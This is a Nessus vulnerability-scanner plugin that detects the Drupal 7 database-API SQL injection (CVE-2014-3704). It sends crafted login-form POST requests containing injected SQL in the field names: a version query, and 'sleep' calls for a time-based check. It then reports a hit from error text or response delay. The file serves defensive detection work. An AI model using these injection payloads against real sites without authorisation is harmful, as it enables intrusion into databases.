#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(78515);
  script_version("$Revision: 1.16 $");
  script_cvs_date("$Date: 2017/05/16 19:35:38 $");

  script_cve_id("CVE-2014-3704");
  script_bugtraq_id(70595);
  script_osvdb_id(113371);
  script_xref(name:"EDB-ID", value:"34984");
  script_xref(name:"EDB-ID", value:"34992");
  script_xref(name:"EDB-ID", value:"34993");
  script_xref(name:"EDB-ID", value:"35150");

  script_name(english:"Drupal Database Abstraction API SQLi");
  script_summary(english:"Attempts to execute a SQLi exploit against the Drupal instance.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server is running a PHP application that is affected by
a SQL injection vulnerability.");
  script_set_attribute(attribute:"description", value:
"The remote web server is running a version of Drupal that is affected
by a SQL injection vulnerability due to a flaw in the Drupal database
abstraction API, which allows a remote attacker to use specially
crafted requests that can result in arbitrary SQL execution. This may
lead to privilege escalation, arbitrary PHP execution, or remote code
execution.");
  script_set_attribute(attribute:"see_also", value:"https://www.drupal.org/SA-CORE-2014-005");
  script_set_attribute(attribute:"see_also", value:"https://www.drupal.org/drupal-7.32-release-notes");
  script_set_attribute(attribute:"solution", value:"Upgrade to version 7.32 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploit_framework_core", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"Drupal core 7.x SQL Injection");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'Drupal HTTP Parameter Key/Value SQL Injection');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");
  script_set_attribute(attribute:"exploit_framework_canvas", value:"true");
  script_set_attribute(attribute:"canvas_package", value:'CANVAS');

  script_set_attribute(attribute:"vuln_publication_date", value:"2014/10/15");
  script_set_attribute(attribute:"patch_publication_date", value:"2014/10/15");
  script_set_attribute(attribute:"plugin_publication_date", value:"2014/10/16");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:drupal:drupal");

  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2014-2017 Tenable Network Security, Inc.");

  script_dependencies("drupal_detect.nasl");
  script_require_keys("www/PHP", "installed_sw/Drupal");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("install_func.inc");

app = "Drupal";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
url = build_url(qs:dir, port:port);

vuln = FALSE;
time_based = FALSE;

headers = make_array("Content-Type","application/x-www-form-urlencoded");
postdata = "name[0;SELECT+@@version;#]=0;&name[0]=nessus&pass=nessus&test2=" +
  "test&form_build_id=&form_id=user_login_block&op=Log+in";

res = http_send_recv3(
  method : "POST",
  port   : port,
  item   : dir + "/?q=node&destination=node",
  data   : postdata,
  add_headers  : headers,
  exit_on_fail : TRUE
);

if (
  ">Warning</em>: mb_strlen() expects parameter" >< res[2] &&
  "The website encountered an unexpected error." >!< res[2]
)
{
  vuln = TRUE;
  attack_req = http_last_sent_request();
  output = strstr(res[2], ">Warning</em>: mb_strlen()");
}

# Check time based attack for instances where error messages have been
# disabled by the administrator -> https://www.drupal.org/node/244642
if (!vuln && report_paranoia == 2)
{
  stimes = make_list(4, 6, 9);

  for ( i = 0 ; i < max_index(stimes); i ++ )
  {
    http_set_read_timeout(stimes[i] + 10);
    then = unixtime();
    postdata = "name[0;SELECT+sleep(" + stimes[i] + ");#]=&name[0]=nessus" +
      "&pass=fake&test2=test&form_build_id=&form_id=user_login_block&op=Log+in";

    res = http_send_recv3(
      method : "POST",
      port   : port,
      item   : dir + "/?q=node&destination=node",
      data   : postdata,
      add_headers : headers,
      exit_on_fail : TRUE
    );
    now = unixtime();

    ttime = now - then;
    if ( (ttime >= stimes[i]) && (ttime <= (stimes[i] + 5)) )
    {
      vuln = TRUE;
      time_based = TRUE;
      attack_req = http_last_sent_request();
      output = 'The request produced a sleep time of ' + ttime + ' seconds.';
      continue;
    }
    else
      vuln = FALSE;
  }
}

if (!vuln) audit(AUDIT_WEB_APP_NOT_AFFECTED, app, url);

if (time_based)
{
  snip = crap(data:"-", length:30)+' snip '+ crap(data:"-", length:30);
  set_kb_item(name:'www/'+port+'/SQLInjection', value:TRUE);
  if (report_verbosity > 0)
  {
    report =
      '\nNessus was able to exploit the issue using the following request :' +
      '\n' + attack_req + '\n' +
      '\n' + output +
      '\n';
    security_hole(port:port, extra:report);
  }
  else security_hole(port);
  exit(0);
}
else
{
  security_report_v4(
    port       : port,
    severity   : SECURITY_HOLE,
    generic    : TRUE,
    line_limit : 5,
    sqli       : TRUE,  # Sets SQLInjection KB key
    request    : make_list(attack_req),
    output     : chomp(output)
  );
  exit(0);
}

